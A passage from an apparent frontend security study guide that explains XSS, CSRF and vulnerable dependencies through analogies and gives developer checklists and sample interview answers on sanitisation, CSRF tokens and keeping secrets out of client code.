Solution: Check the letter for suspicious instructions (sanitize)

**CSRF = Forging someone's signature**
```
Attacker writes: "Transfer $1000 to attacker"
Pretends it's from you
Bank doesn't check signature validity
```
Solution: Special watermark that only real user can add (CSRF token)

**Dependency vulnerability = Buying a faulty lock**
```
You install lock (npm package)
Lock has hidden flaw (vulnerability)
Intruders exploit it
```
Solution: Check lock before installing, replace if faulty (npm audit)

### Security Checklist for Developers

```javascript
// Before shipping code, ask:

// 1. User Input?
if (userData) {
  // ✅ Rendering in React? Uses escaping by default
  <div>{userData}</div> // Safe

  // ❌ Using dangerouslySetInnerHTML? Sanitize it!
  const clean = DOMPurify.sanitize(userData);
  <div dangerouslySetInnerHTML={{ __html: clean }} />
}

// 2. Form Submission?
<form onSubmit={handleSubmit}>
  // ✅ Have CSRF token?
  <input type="hidden" name="_csrf" value={csrfToken} />
}

// 3. Storing Tokens?
// ❌ localStorage.setItem('token', jwt) - XSS can steal!
// ✅ httpOnly cookie - XSS cannot access

// 4. API Keys?
// ❌ const API_KEY = 'sk-xxx' - Exposed in bundle!
// ✅ Call your server, server calls API

// 5. Dependencies?
npm audit // Check for vulnerabilities
```

### Interview Scenario Questions

**"A user reports an XSS vulnerability in comments. What do you do?"**

Your answer:
1. Immediately sanitize comment rendering with DOMPurify
2. Check if vulnerability was exploited (access logs for suspicious activity)
3. Reset passwords for affected accounts
4. Add security header CSP to prevent inline scripts
5. Implement automated testing for XSS
6. Conduct security audit of other user input areas

**"How do you prevent CSRF attacks?"**

Your answer:
```javascript
// Generate unique token per user session
GET /api/csrf-token -> returns { token: 'xyz123' }

// Include token in forms/requests
<input type="hidden" name="_csrf" value="xyz123" />
fetch('/api/transfer', {
  method: 'POST',
  headers: { 'X-CSRF-Token': 'xyz123' }
})

// Backend validates token matches session
if (req.body._csrf !== req.session.csrfToken) {
  throw new Error('CSRF validation failed');
}
```

**"Where should you NOT put sensitive data?"**

Your answer:
- Client-side React code (visible in bundle)
- localStorage/sessionStorage (XSS can access)
- Query parameters (visible in URL)
- Plain cookies without HttpOnly flag
- Comments/console.log (visible in DevTools)

**Safe places:**
- Backend .env files
- httpOnly cookies
- Secure environment variables
- Behind API authentication

---

## Security Best Practices Checklist

**Frontend (React)**
- [ ] No `dangerouslySetInnerHTML` without sanitization
- [ ] No sensitive data in client code
- [ ] Input validation before submission
- [ ] Use httpOnly cookies for auth tokens
- [ ] No hardcoded API keys or secrets
- [ ] Validate redirect URLs

**Backend (Node/Python/etc)**
- [ ] Validate all user input
- [ ] Use parameterized queries (no SQL injection)
- [ ] Hash passwords (never plain text)
- [ ] Implement CSRF protection
- [ ] Rate limiting on APIs
- [ ] Authenticate before returning data
- [ ] Authorize based on user ownership
- [ ] Log security events

**Deployment**
- [ ] HTTPS only (no HTTP)
- [ ] Secure headers (CSP, HSTS, X-Frame-Options)
- [ ] Keep dependencies updated
- [ ] Run npm audit regularly
- [ ] Use environment variables for secrets
- [ ] Set proper CORS headers
- [ ] Enable HTTPS redirects
- [ ] Regular security audits

---
